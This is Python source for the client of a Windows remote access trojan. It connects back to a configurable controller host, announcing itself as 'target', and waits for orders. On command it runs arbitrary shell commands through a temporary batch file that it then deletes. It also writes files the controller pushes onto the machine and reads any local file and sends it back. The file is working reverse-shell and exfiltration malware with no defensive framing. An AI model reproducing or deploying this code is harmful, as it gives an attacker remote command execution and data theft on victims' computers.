import socket 
import subprocess 
from time import sleep 
import os  
import arabic_reshaper

persian = 'ﺍﺁﺑﭙﺘﺜﺠﭽﺤﺨﺪﺫﺭﺯﮊﺳﺸﺼﻀﻄﻈﻌﻐﻔﻘﮑﮕﻠﻤﻨﻮﻫﻲ'
username = os.path.abspath(__file__).split('\\')[2]


client = socket.socket(socket.AF_INET , socket.SOCK_STREAM) 



def connection() :
    while True : 
        
        try : 
            sleep(2)
            ip = '127.0.0.1'    # Enter the Ip
            port = 12345        # Enter the Port
            client.connect((ip , port))
            client.send('target'.encode('utf-8')) 
            break 
        except : 
            pass 

connection()
stdout , stderr = subprocess.Popen('cd',shell=True,text=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
path = stdout.split('\n')[0]

def t_check() : 
    client.send('done'.encode('utf-8',errors='ignore'))
    
def m_check() : 
    if client.recv(4096).decode('utf-8',errors='ignore') != 'done' : 
        m_check()

def get_dir(path) : 
    all_entries = os.listdir(path) 
    file_info = []  
    for entry in all_entries:  
        entry_path = os.path.join(path, entry)  
        if os.path.isfile(entry_path):  
            file_type = 'File'  
            size = os.path.getsize(entry_path)  
            file_info.append({'name': entry, 'type': file_type, 'size': size})  
        elif os.path.isdir(entry_path):  
            file_type = 'Directory'  
            size = 0  
            file_info.append({'name': entry, 'type': file_type, 'size': size})  
    result = ''
    for info in file_info:
        pe = False
        for i in arabic_reshaper.reshape(info['name']) :
            if i in persian :
                pe = True
                break
        if pe == True :
            result+=f"Name: {arabic_reshaper.reshape(info['name'])[::-1]}   /   Type: {info['type']}   /   Size: {info['size']} bytes\n"
        else :
            result+=f"Name: {arabic_reshaper.reshape(info['name'])}   /   Type: {info['type']}   /   Size: {info['size']} bytes\n"
    return result

def display_cmd(txt) : 
    
    txt = txt.split('\n')[:-1]
    
    name = []
    type = []
    size = []
    for i in txt : 
        a = i.split('   /   ')
        name.append(a[0])
        type.append(a[1])
        size.append(a[2])
    
    name_len = len(sorted(name,key=len)[-1])
    type_len = len(sorted(type,key=len)[-1])
    size_len = len(sorted(size,key=len)[-1])
    total = [name,type,size]
    for l in range(0,len(total)) : 
        if l == 0 : 
            lengh = name_len
        elif l == 1 : 
            lengh = type_len
        else : 
            lengh = size_len
        for data in range(0,len(total[l])) : 
            total[l][data] = f"   {total[l][data]}{(lengh-len(total[l][data]))*' '}   "
    result = ''
    name = total[0]
    type = total[1]
    size = total[2]
    for i in range(0,len(name)) : 
        result+=f'{name[i]}{type[i]}{size[i]}\n'
    return result


while True :
    try :
        result = b''
        message = client.recv(1024).decode('utf-8',errors='ignore')
        if message == 'transfer' : 
            t_check()
            w_path = client.recv(4096).decode('utf-8',errors='ignore')
            w_path = '\\'.join(w_path.split('\/'))
            t_check()
            size = int(client.recv(4096).decode('utf-8',errors='ignore'))
            
            t_check()
            i=0
            result = b''
            while True : 
                result+=client.recv(4096)
                if result[-4:] == b'done' : 
                    result = result[:-4]
                    break
                i+=4096  
                
            with open(w_path,'wb') as file : 
                file.write(result)
                file.close()
            t_check()
        
        if message == 'command' : 
            t_check()
            command = client.recv(4096).decode('utf-8',errors='ignore')
            t_check() 
            def path_command(command,path) : 
                try :
                    os.chdir(r'{}'.format(path))
                except : 
                    path = '\\'.join(path.split('\\')[:-1]) 
                con = False
               
                with open(f'C:\\Users\\{username}\\Documents\\test.bat','w',encoding='utf-8') as file : 
                    
                    if command == 'dir' : 
                        result = get_dir(path)
                        result = display_cmd(result)
                        
                    if 'cd ' in command or command == 'cd..' : 
                        
                        file.write(f'@echo off\ncd')
                        
                    elif command[:-1] == 'ND ' : 
                        file.write(f'@echo off\ncd/d {command[-1]}:\ncd') 
                                   
                    else : 
                        
                        file.write(f'@echo off\n{command}')
                        
                    file.close() 
                
                if command != 'dir' : 
                    a = subprocess.Popen(f'C:\\Users\\{username}\\Documents\\test.bat',shell=True,text=True,stdout=subprocess.PIPE ,stdin=subprocess.PIPE ,stderr=subprocess.PIPE)
                    stdout , stderr = a.communicate()
                    result = stderr+stdout
                   
                    con = True
                
                if result == '' : 
                    result = 'No result'
                if con == True :
                    subprocess.Popen(f'del "C:\\Users\\{username}\\Documents\\test.bat"',shell=True)
                    
                
                size = str(len(result))
                client.send(f'{size}'.encode('utf-8',errors='ignore'))
                m_check()
                client.sendall(f'{result}'.encode('utf-8',errors='ignore'))
                client.sendall('done'.encode('utf-8',errors='ignore')) 
                
                
            if 'cd ' in command :
            
                if command[-1] == ':' : 
                    path = f'{command[3:]}'
                    
                    path_command(f'ND {command[-2]}',path)
                else :    
                    path = path+f'{command[3:]}'
                    
                    path_command(command,path)     
                
                    
            elif command == 'cd..' :
                
                if '\\' in path :
                    path = '\\'.join(path.split('\\')[:-1])
                if path[-1] == ':' : 
                    path+='\\'
            
                
                path_command(command,path) 
            
            
            else : 
                
           
                path_command(command,path)
                
            
        if message == 'copy' : 
            t_check() 
            t_path = client.recv(4096).decode('utf-8',errors='ignore')
            t_path = '\\'.join(t_path.split('\/'))
            t_check()
            with open(t_path,'rb') as file : 
                result = file.read()
                file.close() 

            client.send(str(len(result)).encode('utf-8',errors='ignore'))
            m_check()
            client.sendall(result)
            client.send('done'.encode('utf-8',errors='ignore'))
            
            
                
            
        if message == 'close' : 
            client.close()
            break
    except Exception as e :
        
        client.close()
        client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        connection()
